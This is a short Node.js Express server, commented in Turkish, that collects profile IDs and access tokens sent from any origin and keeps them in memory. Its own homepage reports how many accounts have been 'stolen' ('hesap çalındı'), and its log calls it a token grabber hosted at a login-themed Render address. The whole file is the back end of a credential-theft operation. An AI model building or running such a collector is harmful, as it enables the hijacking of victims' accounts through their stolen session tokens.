const express = require('express');
const app = express();

// CORS middleware ekliyoruz
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Test için *, production'da değiştirebilirsin
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // OPTIONS preflight isteklerini hemen cevapla
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

// JSON body parser
app.use(express.json());

let users = []; // { profileId, accessToken }

app.post('/adduser', (req, res) => {
  const { profileId, accessToken } = req.body;

  if (!profileId || !accessToken) {
    return res.status(400).json({ success: false, message: 'profileId ve accessToken gerekli' });
  }

  // Aynı profileId varsa güncelle, yoksa ekle
  const existingIndex = users.findIndex(u => u.profileId === profileId);
  if (existingIndex !== -1) {
    users[existingIndex].accessToken = accessToken;
    console.log(`Hesap güncellendi → ${profileId}`);
  } else {
    users.push({ profileId, accessToken });
    console.log(`Yeni hesap eklendi → ${profileId}`);
  }

  res.json({ success: true, total: users.length });
});

app.get('/userlist', (req, res) => {
  res.json({
    total: users.length,
    accounts: users.map(u => ({ profileId: u.profileId })) // Güvenlik için tokenları gizle (isteğe bağlı)
  });
});

app.get('/', (req, res) => {
  res.send(`<h1 style="text-align:center;color:#00ff00;font-family:Arial;">OBFX v2.0 AKTİF 🔥<br>Toplam ${users.length} hesap çalındı!</h1>`);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`OBFX WebSocket Çekici çalışıyor → Port: ${port}`);
  console.log(`Ana sayfa: https://api-login-2m8o.onrender.com`);
});
